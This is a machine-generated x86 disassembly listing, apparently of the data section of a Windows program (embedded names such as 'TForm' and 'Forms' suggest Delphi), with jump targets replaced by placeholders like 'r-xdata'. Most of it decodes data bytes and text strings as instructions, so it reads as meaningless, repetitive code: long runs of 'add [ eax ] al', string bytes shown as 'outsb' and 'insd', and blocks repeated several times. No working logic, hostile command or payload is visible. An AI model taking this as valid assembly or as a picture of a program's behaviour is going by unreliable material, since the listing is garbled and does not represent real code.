imul ebp [ esi + 0x74 ] 0x6c616353
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
les eax [ eax + eax - 0x70 ]
enter 0x44c4 0x0
add ecx [ ecx ]
push esp
pop esp
je r-xdata
je r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add [ eax - 0x3b ] ah
inc esp
add [ ecx ] cl
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shl [ eax + 0x60044c4 ] 0xc
push esp
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
lds eax [ fs : eax + eax + 0x3 ]
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
outsd
dec eax
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc ebx
insb
push eax
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebp + eax * 8 + 0x70060044 ] dh
outsd
add [ eax ] eax
andps xmm0 [ ebp + 0x66 ]
lds eax [ eax + eax + 0x3 ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
nop
insd
popad
jb r-xdata
popad
dec ebp
inc esp
jae r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
je r-xdata
jo r-xdata
push cs
popad
je r-xdata
inc esp
add [ esi ] al
or al 0x54
jns r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax ] al
adc [ eax ] al
nop
rol dh 0x1
inc esp
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
jae r-xdata
jo r-xdata
jb r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add ah bh
inc esi
outsd
jb r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lds eax [ eax + eax + 0x6 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cld
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
add dh al
inc esp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
jo r-xdata
outsd
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
push 0xb40044c1
mov al 0x41
add [ eax + 0x440044f6 ] dl
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov al 0xc7
inc ebp
jbe r-xdata
add cl [ eax ]
push es
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
jb r-xdata
insd
outsd
jo r-xdata
add [ eax ] al
mov ah 0xc5
inc esp
add [ esi ] al
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] cl
inc eax
add ah bh
lds eax [ eax + eax - 0x73 ]
inc eax
add [ esi + eax * 8 + 0x10080044 ] cl
push esp
inc ebx
insb
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
pushad
les eax [ eax + eax + 0x3 ]
inc esi
outsd
jb r-xdata
inc ebx
add [ esi + edi * 8 ] bl
inc esp
add [ edi + eax * 2 + 0x41 ] ch
add [ edx + edi * 8 + 0x44 ] ch
add [ eax - 0x4bffbb06 ] ch
sti
inc esp
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ esp + eax ] ch
inc ebp
add [ ebp + ebp * 4 + 0x3fcc0041 ] ch
inc ebp
add [ esi * 8 - 0x1aabffbc ] al
inc ebx
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ ecx + eax ] cl
inc ebp
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax ] al
add al [ ebp ]
jl r-xdata
sub al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + edi * 8 - 0x15bfffbc ] ch
inc ebx
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add ah dh
add eax [ ebp ]
rol [ edx ] 0x45
add [ eax + 0x78 ] al
inc ebx
add [ esp + eax + 0x45 ] ch
add al al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
add al 0xf4
inc esp
add [ eax ] dl
or eax [ ebp ]
or al 0xb4
inc ebx
add ah dl
pop ss
inc ebp
add [ ebx + ebx ] dh
inc ebp
add al dh
sbb [ ebp ] eax
movsb [ edi ] [ esi ]
mov ah 0x43
add [ eax + 0x6c0043b4 ] ch
sbb al 0x45
add [ eax ] cl
mov bl 0x43
add [ eax + 0x600043df ] al
and eax [ ebp ]
adc cl dh
inc ebx
add ah bh
fild [ ebx ]
je r-xdata
add al bl
xor al 0x40
add [ eax + 0x2c00451c ] dh
xor al [ eax ]
dec eax
xor al [ eax ]
lodsb [ esi ]
clc
inc esp
add [ eax - 0x16 ] al
add [ eax + esi * 4 - 0x96fffbf ] dh
inc esp
add [ eax + edi * 8 + 0x44 ] al
pop es
dec ecx
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
outsb
add [ eax ] al
jb r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
outsd
outsd
insb
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jae r-xdata
les eax [ eax + eax + 0x3 ]
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
lodsb [ esi ]
adc [ eax ] al
cmp al 0x2
add [ eax ] al
test al 0xc3
inc esp
add [ eax + 0x2 ] dl
add [ eax ] al
fadd st3
inc esp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebp
add al bh
in eax dx
inc esp
add [ eax + 0x540044f0 ] ch
sub [ ebp ] eax
nop
stc
inc esp
add [ edx + edi * 8 ] cl
inc esp
add [ esp + edi + 0x45 ] dl
add al cl
test [ eax + eax + 0x58 ] 0x37
inc ebp
add [ eax ] bh
push ds
inc ebp
add [ ecx + edi ] cl
inc ebp
add al dh
add eax [ ebp ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ch
clc
inc esp
inc esp
jb r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 8 - 0x35b7ffbc ] ah
inc esp
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x384fffc0 ] cl
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
adc [ eax + 0x6f ] esi
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dh al
enter 0x44 0x36
0x44
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al 0xc7
inc esp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
mov [ eax + eax + 0x8 ] 0xb
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_44c788
clc
add al [ eax ]
add [ eax - 0x3f ] ch
inc esp
add [ eax + esi * 4 - 0x96fffbf ] dh
inc esp
add [ eax + edi * 8 + 0x44 ] al
add al bl
xor al 0x40
add [ eax + 0x2c00451c ] dh
xor al [ eax ]
dec eax
xor al [ eax ]
lodsb [ esi ]
clc
inc esp
add [ eax - 0x16 ] al
inc ebx
add [ esi + edi * 8 ] bl
inc esp
add [ edi + eax * 2 + 0x41 ] ch
add [ edx + edi * 8 + 0x44 ] ch
add [ eax - 0x4bffbb06 ] ch
sti
inc esp
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ esp + eax ] ch
inc ebp
add [ ebp + ebp * 4 + 0x3fcc0041 ] ch
inc ebp
add [ esi * 8 - 0x1aabffbc ] al
inc ebx
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ ecx + eax ] cl
inc ebp
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax ] al
add al [ ebp ]
jl r-xdata
sub al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + edi * 8 - 0x15bfffbc ] ch
inc ebx
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add ah dh
add eax [ ebp ]
rol [ edx ] 0x45
add [ eax + 0x78 ] al
inc ebx
add [ esp + eax + 0x45 ] ch
add al al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
add al 0xf4
inc esp
add [ eax ] dl
or eax [ ebp ]
or al 0xb4
inc ebx
add ah dl
pop ss
inc ebp
add [ ebx + ebx ] dh
inc ebp
add al dh
sbb [ ebp ] eax
movsb [ edi ] [ esi ]
mov ah 0x43
add [ eax + 0x6c0043b4 ] ch
sbb al 0x45
add [ eax ] cl
mov bl 0x43
add [ eax + 0x600043df ] al
and eax [ ebp ]
adc cl dh
inc ebx
add ah bh
fild [ ebx ]
je r-xdata
lodsb [ esi ]
adc [ eax ] al
cmp al 0x2
add [ eax ] al
test al 0xc3
inc esp
add [ eax + 0x2 ] dl
add [ eax ] al
fadd st3
inc esp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebp
add al bh
in eax dx
inc esp
add [ eax + 0x540044f0 ] ch
sub [ ebp ] eax
nop
stc
inc esp
add [ edx + edi * 8 ] cl
inc esp
add [ esp + edi + 0x45 ] dl
add al cl
test [ eax + eax + 0x58 ] 0x37
inc ebp
add [ eax ] bh
push ds
inc ebp
add [ ecx + edi ] cl
inc ebp
add al dh
add eax [ ebp ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ch
sub_44ca6c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xcb
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffbb35 ] ch
add al [ eax ]
add [ edi + eax * 8 + 0x44 ] ah
add [ eax + esi * 4 - 0x96fffbf ] dh
inc esp
add [ eax + edi * 8 + 0x44 ] al
add al bl
xor al 0x40
add [ eax + 0x2c00451c ] dh
xor al [ eax ]
dec eax
xor al [ eax ]
lodsb [ esi ]
clc
inc esp
add [ eax - 0x16 ] al
inc ebx
add [ esi + edi * 8 ] bl
inc esp
add [ edi + eax * 2 + 0x41 ] ch
add [ edx + edi * 8 + 0x44 ] ch
add [ eax - 0x4bffbb06 ] ch
sti
inc esp
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ esp + eax ] ch
inc ebp
add [ ebp + ebp * 4 + 0x3fcc0041 ] ch
inc ebp
add [ esi * 8 - 0x1aabffbc ] al
inc ebx
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ ecx + eax ] cl
inc ebp
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax ] al
add al [ ebp ]
jl r-xdata
sub al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + edi * 8 - 0x15bfffbc ] ch
inc ebx
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add ah dh
add eax [ ebp ]
rol [ edx ] 0x45
add [ eax + 0x78 ] al
inc ebx
add [ esp + eax + 0x45 ] ch
add al al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
add al 0xf4
inc esp
add [ eax ] dl
or eax [ ebp ]
or al 0xb4
inc ebx
add ah dl
pop ss
inc ebp
add [ ebx + ebx ] dh
inc ebp
add al dh
sbb [ ebp ] eax
movsb [ edi ] [ esi ]
mov ah 0x43
add [ eax + 0x6c0043b4 ] ch
sbb al 0x45
add [ eax ] cl
mov bl 0x43
add [ eax + 0x600043df ] al
and eax [ ebp ]
adc cl dh
inc ebx
add ah bh
fild [ ebx ]
je r-xdata
inc esp
add [ edi ] al
add eax 0x726f4654
insd
mov ah 0xca
inc esp
add [ edx + ecx * 8 + 0x44 ] al
add [ esi ] bl
add eax 0x6d726f46
jae r-xdata
inc ebp
add al bh
in eax dx
inc esp
add [ eax + 0x540044f0 ] ch
sub [ ebp ] eax
nop
stc
inc esp
add [ edx + edi * 8 ] cl
inc esp
add [ esp + edi + 0x45 ] dl
add al cl
test [ eax + eax + 0x58 ] 0x37
inc ebp
add [ eax ] bh
push ds
inc ebp
add [ ecx + edi ] cl
inc ebp
add al dh
add eax [ ebp ]
add eax 0x726f4654
insd
mov eax eax
mov ah 0xcb
add [ ecx ] al
add [ esp + ebp + 0x3c0041 ] dl
add dh bh
and [ ebx + 0x43 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
cld
inc ebx
add [ eax ] ah
add al [ eax ]
call [ ebx + 0xf940045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d000e ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
outsb
je r-xdata
sub eax [ ebx ]
popad
add [ eax ] al
inc [ eax ]
imul eax [ ebx ] 0xffffff9c
imul eax [ ebx ] 0x0
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
insb
jo r-xdata
pushfd
or al 0x45
add [ edi + ecx + 0x45 ] dl
add [ eax + 0x7 ] al
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ edi + ebp * 8 + 0x44 ]
add [ eax ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add bh bh
sub [ ecx + 0x45 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
[ eax ]
inc ebx
add [ ebx ] bl
add bh bh
shr [ ebx + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
jb r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
insb
adc [ eax ] al
loope r-xdata
call 0x6543ce1e
inc ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
hlt
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
inc edx
outsd
retn
je r-xdata
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
sar [ eax + 0x43 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xac65646f
les eax [ eax + eax + 0x28 ]
add al [ eax ]
[ esp + ecx + 0xf940045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
cmp al 0x41
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
inc ebp
add [ eax ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
lodsb [ esi ]
ja r-xdata
add [ eax + 0x430b001b ] al
insb
add [ eax ] al
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
call 0x404512dc
jb r-xdata
insb
adc [ gs : edx ] bh
inc ebx
add [ ecx + eax ] ch
dec [ eax + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
outsd
cwde
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
dec eax

add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
outsb
je r-xdata
popad
outsb
js r-xdata
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
adc [ eax ] al
mov al 0x71
inc ebx
add ah bl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x0
inc esp
add al [ eax ]
push [ ecx ]
add al dl
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
add al [ ebp ]
inc eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ eax - 0x17ffbc8f ] dh
inc ecx
add [ eax ] dh
add bh bh
dec esp
jns r-xdata
jno r-xdata
popad
jo r-xdata
add [ edi + ecx + 0x45 ] dl
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ eax ] al
add [ eax + eax ] ah
lds eax [ eax + eax + 0x31 ]
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add al [ eax ]
call [ edi + ecx + 0x45 ]
add [ eax + 0x3 ] al
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
jb r-xdata
add [ edi + 0xff0001 ] ah
loop r-xdata
jae r-xdata
mov edi 0x2ec0041
add bh bh
push eax
inc ecx
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add ah ch
add al [ eax ]
call [ eax + 0x41 ]
add [ eax + 0x79 ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add al ch
pop ebp
add [ eax ] al
jmp [ eax ]
sub al [ ebx ]
outsd
outsb
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
loopne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x5300ffff ] ah
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
inc eax
sub al 0x43
add [ eax + eax ] dh
[ eax - 0x64 ]
inc ebx
add [ ecx ] al
add [ eax ] al
sub_44d958
mov edi 0x88ffbdff
inc ebx
inc ebp
add [ eax + 0x48004543 ] dh
inc esp
inc ebp
add [ eax + 0x74004544 ] ah
inc ebp
inc ebp
add [ ebp + eax * 2 + 0x420c0045 ] cl
inc ebp
add al dh
inc edx
inc ebp
add [ ebx + eax * 2 + 0x45 ] bl
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xda
je r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x59 ] ah
inc ebp
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ edi + edx * 2 + 0x45 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
cmp al 0x0
add [ eax ] al
fdivr [ esi ]
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] ch
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
nop
pop esp
fild [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 8 - 0x2427ffbc ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
fild [ eax + eax + 0x40 ]
add [ eax ] eax
add [ eax ] cl
sub al [ ecx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
inc esp
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add [ eax ] al
add [ edx + ebx * 8 ] ch
xchg esp eax
fld [ eax + eax + 0x7 ]
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
fcomp st3
inc esp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
add al dl
xor al 0x40
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
pop esp
fild [ eax + eax + 0x4 ]
sub eax [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x54080040 ] al
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x8400408d
fiadd [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 8 - 0x252bffbc ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
fiadd [ eax + eax - 0x60 ]
add [ eax ] al
add [ eax ] cl
sub al [ ecx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al ch
inc edi
inc ebp
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0xe004546 ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
aam 0xda
inc esp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
test dl bl
inc esp
add [ ebx + ebp ] al
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
inc eax
push esp
fadd [ eax + eax + 0x44 ]
0x44
add [ ecx + rw-data ] ah
retn
sub_44d9ad
push cs
add [ 0x6d726f46 ] al
jae r-xdata
push esp
adc [ eax ] al
loopne r-xdata
add [ eax + edx + 0x40 ] dl
add al ah
adc al [ ebp ]
hlt
or eax 0x69500d00
js r-xdata
inc ebp
add ah dh
adc al [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
insb
jae r-xdata
